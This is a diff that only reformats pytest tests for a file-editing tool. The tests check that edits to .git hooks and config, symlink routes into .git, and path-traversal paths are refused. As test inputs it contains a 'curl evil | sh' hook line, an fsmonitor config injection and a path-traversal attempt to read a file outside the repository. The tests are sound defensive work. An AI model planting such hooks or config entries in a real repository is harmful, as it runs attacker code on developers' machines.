@@ -58,7 +58,11 @@ def _plan(*operations: dict) -> dict:
         for key in ("path", "dest"):
             if key in operation and operation[key] not in touched:
                 touched.append(operation[key])
-    return {"schema": "simplicio.mechanical-edit/v1", "touched_files": touched, "operations": list(operations)}
+    return {
+        "schema": "simplicio.mechanical-edit/v1",
+        "touched_files": touched,
+        "operations": list(operations),
+    }
 
 
 def _refused(repo: Path, *operations: dict, apply: bool = True) -> dict:
@@ -112,14 +116,31 @@ def test_the_refusal_also_holds_in_a_dry_run(repo, path):
 @pytest.mark.parametrize(
     "operation",
     [
-        pytest.param({"op": "replace_range", "path": ".git/hooks/pre-commit", "start_line": 2, "end_line": 2, "text": "curl evil | sh\n"},
-                     id="replace-a-line-of-an-existing-hook"),
-        pytest.param({"op": "insert_after", "path": ".git/config", "line": 1, "text": "[core]\n\tfsmonitor = evil\n"},
-                     id="insert-into-config"),
-        pytest.param({"op": "delete_range", "path": ".git/config", "start_line": 1, "end_line": 1}, id="delete-from-config"),
+        pytest.param(
+            {
+                "op": "replace_range",
+                "path": ".git/hooks/pre-commit",
+                "start_line": 2,
+                "end_line": 2,
+                "text": "curl evil | sh\n",
+            },
+            id="replace-a-line-of-an-existing-hook",
+        ),
+        pytest.param(
+            {"op": "insert_after", "path": ".git/config", "line": 1, "text": "[core]\n\tfsmonitor = evil\n"},
+            id="insert-into-config",
+        ),
+        pytest.param(
+            {"op": "delete_range", "path": ".git/config", "start_line": 1, "end_line": 1},
+            id="delete-from-config",
+        ),
         pytest.param({"op": "delete_file", "path": ".git/hooks/pre-commit"}, id="delete-a-hook"),
-        pytest.param({"op": "move_file", "path": "app.py", "dest": ".git/hooks/pre-commit2"}, id="move-into-git"),
-        pytest.param({"op": "move_file", "path": ".git/config", "dest": "stolen-config"}, id="move-out-of-git"),
+        pytest.param(
+            {"op": "move_file", "path": "app.py", "dest": ".git/hooks/pre-commit2"}, id="move-into-git"
+        ),
+        pytest.param(
+            {"op": "move_file", "path": ".git/config", "dest": "stolen-config"}, id="move-out-of-git"
+        ),
         pytest.param({"op": "move_file", "path": "app.py", "dest": ".GIT/config2"}, id="move-into-upper-git"),
     ],
 )
@@ -159,12 +180,17 @@ def test_a_symlink_to_git_is_refused_for_a_new_file(repo):
 def test_a_symlink_to_the_git_dir_is_refused(repo):
     (repo / "gitlink").symlink_to(".git")
     _refused(repo, _create("gitlink/hooks/post-commit"))
-    _refused(repo, {"op": "insert_after", "path": "gitlink/config", "line": 1, "text": "[core]\n\tfsmonitor = evil\n"})
+    _refused(
+        repo,
+        {"op": "insert_after", "path": "gitlink/config", "line": 1, "text": "[core]\n\tfsmonitor = evil\n"},
+    )
 
 
 def test_a_symlink_to_a_file_inside_git_is_refused(repo):
     (repo / "hook-link").symlink_to(".git/hooks/pre-commit")
-    _refused(repo, {"op": "replace_range", "path": "hook-link", "start_line": 2, "end_line": 2, "text": "evil\n"})
+    _refused(
+        repo, {"op": "replace_range", "path": "hook-link", "start_line": 2, "end_line": 2, "text": "evil\n"}
+    )
 
 
 def test_a_chain_of_symlinks_that_ends_in_git_is_refused(repo):
@@ -218,7 +244,9 @@ def test_a_symlink_to_an_ordinary_directory_inside_the_repository_still_works(re
 
 def test_a_mixed_plan_is_refused_whole_and_writes_nothing(repo):
     before = _tree(repo)
-    result = execute_plan(_plan(_create("fine.txt"), _create(".git/hooks/post-commit")), root=repo, apply=True)
+    result = execute_plan(
+        _plan(_create("fine.txt"), _create(".git/hooks/post-commit")), root=repo, apply=True
+    )
     assert result["status"] == "refused" and result["applied"] is False
     assert _tree(repo) == before and not (repo / "fine.txt").exists()
 
@@ -236,15 +264,33 @@ def test_the_cli_compile_step_refuses_a_hook_before_it_pins_the_plan(tmp_path, c
     git_repo = tmp_path / "gitrepo"
     git_repo.mkdir()
     (git_repo / "app.py").write_text("old\n", encoding="utf-8")
-    for args in (["init", "-q"], ["add", "app.py"], ["-c", "user.email=a@example.com", "-c", "user.name=t", "commit", "-qm", "i"]):
+    for args in (
+        ["init", "-q"],
+        ["add", "app.py"],
+        ["-c", "user.email=a@example.com", "-c", "user.name=t", "commit", "-qm", "i"],
+    ):
         subprocess.run(["git", "-C", str(git_repo), *args], check=True, capture_output=True)
     (git_repo / "hooks-link").symlink_to(".git/hooks")
     ops = tmp_path / "ops.json"
     compiled = tmp_path / "compiled.json"
     before = _tree(git_repo)
     for path in (".git/hooks/post-commit", "hooks-link/post-commit", ".GIT/config", ".git\\config"):
-        ops.write_text(json.dumps({"operations": [{"path": path, "find": "", "replace": "planted\n"}]}), encoding="utf-8")
-        code = cli.main(["edit", "--root", str(git_repo), "--plan", str(ops), "--compile", str(compiled), "--json", "--no-runtime"])
+        ops.write_text(
+            json.dumps({"operations": [{"path": path, "find": "", "replace": "planted\n"}]}), encoding="utf-8"
+        )
+        code = cli.main(
+            [
+                "edit",
+                "--root",
+                str(git_repo),
+                "--plan",
+                str(ops),
+                "--compile",
+                str(compiled),
+                "--json",
+                "--no-runtime",
+            ]
+        )
         out = capsys.readouterr().out
         assert code != 0 and "unsafe_path" in out, (path, out)
         assert not compiled.exists(), path
@@ -277,8 +323,22 @@ def test_the_compile_step_refuses_an_unsafe_path_before_it_reads_the_file(tmp_pa
     outside = tmp_path / "outside.txt"
     outside.write_text("secret\n", encoding="utf-8")
     for path in (str(outside), "../outside.txt", "sub/../../outside.txt"):
-        ops.write_text(json.dumps({"operations": [{"path": path, "find": "secret", "replace": "x"}]}), encoding="utf-8")
-        code = cli.main(["edit", "--root", str(git_repo), "--plan", str(ops), "--compile", str(compiled), "--json", "--no-runtime"])
+        ops.write_text(
+            json.dumps({"operations": [{"path": path, "find": "secret", "replace": "x"}]}), encoding="utf-8"
+        )
+        code = cli.main(
+            [
+                "edit",
+                "--root",
+                str(git_repo),
+                "--plan",
+                str(ops),
+                "--compile",
+                str(compiled),
+                "--json",
+                "--no-runtime",
+            ]
+        )
         out = capsys.readouterr().out
         assert code != 0 and "unsafe_path" in out and "matched" not in out, (path, out)
         assert not compiled.exists()
@@ -290,7 +350,10 @@ def test_a_changeset_transaction_refuses_a_hook_and_leaves_no_staging_directory(
 
     before = _tree(repo)
     result = execute_changeset_transaction(
-        _plan(_create(".git/hooks/post-commit")), root=repo, idempotency_key="k-git", changeset_digest_value="d-git"
+        _plan(_create(".git/hooks/post-commit")),
+        root=repo,
+        idempotency_key="k-git",
+        changeset_digest_value="d-git",
     )
     assert result["status"] == "refused" and {e["code"] for e in result["errors"]} == {"unsafe_path"}
     assert not (repo / ".git" / "hooks" / "post-commit").exists()
